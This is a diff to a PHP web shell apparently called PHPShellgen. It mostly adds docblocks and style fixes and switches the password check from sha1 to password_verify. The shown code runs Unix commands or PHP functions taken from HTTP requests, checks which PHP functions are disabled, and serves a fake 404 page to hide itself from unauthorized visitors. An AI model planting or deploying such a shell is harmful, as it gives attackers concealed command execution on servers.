@@ -1,9 +1,23 @@
 <?php
+// phpcs:ignore error
+
 session_start();
 
-class Shell {
+/**
+ * Shell represents a virtual terminal.
+ * @category PHPShellgen
+ * @package PHPShellgen
+ * @author Cixtor <cixtor@github.test>
+ * @license MIT https://opensource.org/licenses/MIT
+ * @link <shell>
+ */
+class Shell
+{
     public $config;
 
+    /**
+     * Initializes the shell configuration.
+     */
     public function __construct()
     {
         if (function_exists('gethostname')) {
@@ -50,6 +64,10 @@ class Shell {
         $this->config['prompt'] = $this->getPrompt();
     }
 
+    /**
+     * Returns a terminal prompt (status).
+     * @return string Terminal prompt (status).
+     */
     private function getPrompt()
     {
         return sprintf(
@@ -61,14 +79,24 @@ class Shell {
         );
     }
 
-    public function login($username = '', $password = '')
+    /**
+     * Returns True if the username and password are correct.
+     * @param  string $u Username
+     * @param  string $p Password
+     * @return bool      True if the credentials are correct.
+     */
+    public function login(string $u = "", string $p = "")
     {
         return (bool) (
-            sha1($username) === $this->config['username']
-            && sha1($password) === $this->config['password']
+            password_verify($u, $this->config['username'])
+            && password_verify($p, $this->config['password'])
         );
     }
 
+    /**
+     * Checks whether the HTTP request is an Ajax request or not.
+     * @return bool True if the HTTP request is an Ajax request.
+     */
     private function isAjaxRequest()
     {
         return (bool) (
@@ -77,6 +105,11 @@ class Shell {
         );
     }
 
+    /**
+     * Returns the value of an HTTP request parameter.
+     * @param  string $input Parameter to read.
+     * @return string|bool Parameter value.
+     */
     private function request($input = '')
     {
         if (array_key_exists('REQUEST_METHOD', $_SERVER)) {
@@ -96,6 +129,10 @@ class Shell {
         return false;
     }
 
+    /**
+     * Returns a list of disabled PHP functions.
+     * @return array List of disabled PHP functions
+     */
     private function disabledFunctions()
     {
         $functions = array();
@@ -116,6 +153,10 @@ class Shell {
         return $functions;
     }
 
+    /**
+     * Prints the result of the command execution.
+     * @return void
+     */
     public function handleExecution()
     {
         if ($this->isAjaxRequest()) {
@@ -130,6 +171,11 @@ class Shell {
         }
     }
 
+    /**
+     * Runs a Unix command or local PHP function.
+     * @param  string $command Unix command or PHP function.
+     * @return string          Result of the command or function.
+     */
     private function execute($command = '')
     {
         if (!empty($command)) {
@@ -250,7 +296,7 @@ if (!empty($_POST)
     $_SESSION['authorized'] = 1;
 }
 ?>
-<?php if (!isset($_SESSION['authorized']) || $_SESSION['authorized'] !== 1): ?>
+<?php if (!isset($_SESSION['authorized']) || $_SESSION['authorized'] !== 1) : ?>
 <?php header('HTTP/1.1 404 Not Found'); ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
